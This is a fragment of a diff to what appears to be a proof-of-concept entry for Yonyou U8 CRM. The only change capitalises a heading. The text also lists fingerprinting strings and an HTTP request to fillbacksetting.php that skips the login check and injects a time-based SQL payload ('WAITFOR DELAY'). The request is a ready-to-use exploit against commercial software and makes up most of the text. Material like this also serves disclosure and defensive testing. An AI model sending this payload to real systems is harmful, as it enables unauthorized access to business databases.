@@ -14,7 +14,7 @@ app.name="用友 CRM"
 title="用友U8CRM"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
